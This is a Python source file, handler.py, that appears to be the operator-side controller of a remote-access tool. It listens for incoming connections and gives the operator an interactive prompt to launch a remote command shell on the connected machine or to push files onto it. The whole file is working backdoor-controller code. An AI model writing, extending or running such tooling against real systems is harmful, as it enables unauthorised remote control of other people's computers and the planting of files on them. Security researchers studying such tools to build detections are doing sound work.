# -*- coding:utf-8 -*-
# @FileName  :handler.py
# @Time      :2022/11/07 21:23:35
# @Author    :D0WE1L1N
import os
import socket
import threading
import sys
import shutil
import cmdshell
import time
def startserver(ip, port):
    if port == "":
        port = 624
    if ip == "":
        ip = "127.0.0.1"
    else:
        try:
            port = int(port)
        except:
            print("handler>[-]port input error")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((ip, port))
        s.listen(10)
    except socket.error as msg:
        print("handler>[-]something went WRONG, print out the wrong msg: " + str(msg))
        sys.exit(1)
    print('handler>[*]Starting handler at ' + ip + ":" + str(port))

    while True:
        conn, addr = s.accept()
        t = threading.Thread(target=PINGPONG_shell, args=(conn, addr, ip, port))
        t.start()

def PINGPONG_shell(conn, addr, ip, port):
    def App_send(App):
        print("PINGPONG>[*]Sending application......")
        conn.send(bytes(App, 'utf8'))
        while True:
            data = conn.recv(1024)
            if data.decode() == "OK":
                print("PINGPONG>[*]Application done, everything is OK")
                return True
    print('handler>[+]Accept new connection from: ' + ip + ":" + str(port))
    while True:
        command = input("PINGPONG>")
        if command == "cmd" or command == "CMD":
            if App_send("CMDSHELL_APP"):
                print("PINGPONG>[+]GOT IT")
                cmdshell.start(ip, 8625)
        elif command == "upload" or command == "UPLOAD":
            file_dir = input("PINGPONG>[*]Please input the location of the file in your host>")
            to_dir = input("PINGPONG>[*]Please input the location of the file where you uploaded>")
            file_names = os.listdir(file_dir)
            if App_send("UPLOAD_APP"):
                print("PINGPONG>[*]Sending dir......")
                conn.send(bytes(to_dir, "utf8"))
                print("PINGPONG>[*]Making temp folders......")
                path = "temp"
                if os.path.exists(path):
                    shutil.rmtree(path)
                if not os.path.exists(path):
                    os.makedirs(path)
                print("PINGPONG>[*]Copy to file to " + path + "......")
                if not os.path.isfile(file_dir):
                    for fi in os.listdir(file_dir):
                        full_file_name = os.path.join(file_dir, fi)
                        if os.path.isfile(full_file_name):
                            shutil.copy(full_file_name, path)
                else:
                    shutil.copy(file_dir, path)
                print("PINGPONG>[*]Turning to .txt......")
                for file in file_names:
                    old_n = os.path.join(path, file)
                    new_name = file + ".txt"
                    os.rename(old_n, new_name)
                    print("PINGPONG>[*]Sending......")
                    with open(new_name, "r") as f:
                        se_data = f.read()
                        conn.send(bytes(new_name, "utf8"))
                        name_data = conn.recv(1024)
                        while True:
                            time.sleep(1)
                            if name_data:
                                break
                        conn.sendall(bytes(se_data, 'utf8'))
                        upload_data = conn.recv(1024)
                        while True:
                            time.sleep(1)
                            if upload_data:
                                print(ip + ">[*]upload_data: " + old_n + "......")
                                break
                        f.close()
                        try:
                            os.remove(new_name)
                        except:
                            pass
                conn.send(bytes("END", 'utf8'))
            shutil.rmtree(path)
            
        else:
            print("PINGPONG>[-]Command " + command + " not found")
                    
if __name__ == "__main__":
    startserver("192.168.140.1", "")